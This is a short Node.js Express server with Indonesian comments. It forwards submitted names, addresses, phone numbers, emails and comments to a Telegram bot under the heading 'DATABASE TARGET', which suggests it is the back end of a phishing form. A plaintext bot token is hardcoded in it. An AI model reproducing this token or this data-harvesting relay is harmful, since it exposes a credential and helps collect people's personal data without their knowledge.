const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
const port = 3000;

// Middleware untuk parse JSON
app.use(bodyParser.json());

// Endpoint untuk menerima data formulir
app.post('/submit', (req, res) => {
    const { name, address, phone, email, comments } = req.body;

    // Format pesan untuk dikirim ke bot Telegram
    const message = `
        *DATABASE TARGET*
        Nama: ${name}
        Alamat: ${address}
        Nomor Telepon: ${phone}
        Email: ${email}
        Komentar: ${comments}
    `;

    // Kirim data ke bot Telegram
    const telegramUrl = `https://api.telegram.org/bot7207871141:AAGQHPInZWuoHSJzHr5s-kZQr4pM63fizPs/sendMessage`;
    const chatId = '6864784021'; // Ganti dengan ID chat Anda

    axios.post(telegramUrl, {
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
    })
    .then(response => {
        res.send('Data telah berhasil dikirim ke bot Telegram!');
    })
    .catch(error => {
        console.error('Error sending message to Telegram:', error);
        res.status(500).send('Terjadi kesalahan saat mengirim data ke Telegram.');
    });
});

// Menjalankan server
app.listen(port, () => {
    console.log(`Server berjalan di http://localhost:${port}`);
});
